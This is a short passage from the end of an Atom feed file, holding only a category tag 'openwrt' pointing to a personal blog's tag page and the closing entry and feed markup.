    <category term="openwrt" scheme="http://s1nec-1o.github.io/tags/openwrt/"/>
    
  </entry>
  
</feed>
